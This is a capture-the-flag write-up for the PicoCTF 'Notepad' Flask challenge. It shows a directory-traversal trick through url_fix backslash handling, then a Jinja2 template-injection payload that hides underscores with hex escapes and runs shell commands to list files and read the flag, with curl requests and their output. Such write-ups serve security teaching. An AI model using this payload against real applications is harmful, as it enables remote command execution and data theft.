﻿# Notepad - PicoCTF

## app.py 

 ```python
 @app.route('/user/<name>')
def greet_user(name):
    return render_template('greet.html', name=name)
```

https://notepad.mars.picoctf.net/ render **index.html** with context variable "error" .

```python
@app.route("/new", methods=["POST"])
def create():
    content = request.form.get("content", "")
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)
```
https://notepad.mars.picoctf.net/new for uploading notes. Variable **content** is taken from the HTML form, filtered with '_' and '/' and if occur, redirect to error html. If not, store new file html note in folder static with file name is `static/{url_fix(content[:128])}-{token_urlsafe(8)}.html`

### url_fix()
Its deprecated in the werkberg library ([here](https://tedboy.github.io/flask/generated/werkzeug.url_fix.html)). Source:
```python
def url_fix(s, charset='utf-8'):
    r"""Sometimes you get an URL by a user that just isn't a real URL because
 it contains unsafe characters like ' ' and so on. This function can fix
 some of the problems in a similar way browsers handle data entered by the
 user:

 >>> url_fix(u'http://de.wikipedia.org/wiki/Elf (Begriffskl\xe4rung)')
 'http://de.wikipedia.org/wiki/Elf%20(Begriffskl%C3%A4rung)'

 :param s: the string with the URL to fix.
 :param charset: The target charset for the URL if the url was given as
 unicode string.
 """
    # First step is to switch to unicode processing and to convert
    # backslashes (which are invalid in URLs anyways) to slashes.  This is
    # consistent with what Chrome does.
    s = to_unicode(s, charset, 'replace').replace('\\', '/')

    # For the specific case that we look like a malformed windows URL
    # we want to fix this up manually:
    if s.startswith('file://') and s[7:8].isalpha() and s[8:10] in (':/', '|/'):
        s = 'file:///' + s[7:]

    url = url_parse(s)
    path = url_quote(url.path, charset, safe='/%+$!*\'(),')
    qs = url_quote_plus(url.query, charset, safe=':&%=+$!*\'(),')
    anchor = url_quote_plus(url.fragment, charset, safe=':&%=+$!*\'(),')
    return to_native(url_unparse((url.scheme, url.encode_netloc(),
                                  path, qs, anchor)))
   ```

Notice that we have
 ```python
s = to_unicode(s, charset, 'replace').replace('\\', '/')
```
which is crucial for bypass "/" filter.

## index.html
```html
    <!doctype  html>
    {% if error is not none %}
		    <h3>
		    error: {{ error }}
		    </h3>
		    {% include "errors/" + error + ".html" ignore missing %}
    {% endif %}
    <h2>make a new note</h2>
    <form  action="/new"  method="POST">
    <textarea  name="content"></textarea>
    <input  type="submit">
    </form> 
 ```

Here, flask used Jinja2 (can SSTI). The **sink** could be the jinja template. Since https://notepad.mars.picoctf.net/?error=7*7 not works, cause the server treats the error string, so the Jinja template could not evaluate it.

=> **Sink**: {% include "errors/" + error + ".html" ignore missing %}

To do that, we have:
```python
name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)
```
From there, we can perform directory traversal to folder **errors**, then by

     {% include "errors/" + error + ".html" ignore missing %}
we evaluate SSTI payload.

## Exploit
With use of url_fix(). We note:

    make a new note
    
    ..\templates\errors\123abc

=> Redirect to: https://notepad.mars.picoctf.net/templates/errors/123abc%0D%0A-4vnyXEK_tLc.html. Then we access it. 
=> https://notepad.mars.picoctf.net/?error=123abc%0D%0A-4vnyXEK_tLc

    error: 123abc -4vnyXEK_tLc
    
     make a new note

Do the same with simple payload {{7*7}}
=>

    error: 123abc {{7*7}}-mAQRWwnJPVg
    
    make a new note

Since it in the name of file, we cant evaluate it, to do this: from **app.py**:
```python
 name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
 ```
After processing with `url_fix()`, the `{{7*7}}` expression contained special character `{` and `}`. So if its exist in the URL, we just pass the value of variable `error`, not the file that we made.

So what we need is make the content longer, then the payload is outbound of 128 characters =>
URL path is valid for access => SSTI!

**Payload:**

    ..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{7*7}}
 ```bash   

    $ curl https://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-nmraL3m59zo
    <!doctype html>
    
      <h3>
        error: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-nmraL3m59zo
      </h3>
      ..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa49
    
    <h2>make a new note</h2>
    <form action="/new" method="POST">
      <textarea name="content"></textarea>
      <input type="submit">
    </form>
```

Then we got this "49".
After a long while to craft my payload with [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti), here is my payload for by pass the `_`
 
 **Payload:**
``` 
{{request['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][11]['\x5f\x5fsubclasses\x5f\x5f']()[273]("ls", shell=True, stdout=-1).communicate()[0].strip()}}
```

```bash
$ curl https://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-wVxNUWfAtG4
<!doctype html>

  <h3>
    error: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-wVxNUWfAtG4
  </h3>
  ..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab&#39;app.py\nflag-c8f5526c-4122-4578-96de-d7dd27193798.txt\nstatic\ntemplates&#39;

<h2>make a new note</h2>
<form action="/new" method="POST">
  <textarea name="content"></textarea>
  <input type="submit">
</form>
```
Do the last round for the flag:
``` 
{{request['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][11]['\x5f\x5fsubclasses\x5f\x5f']()[273]("cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt", shell=True, stdout=-1).communicate()[0].strip()}}
```

> picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}

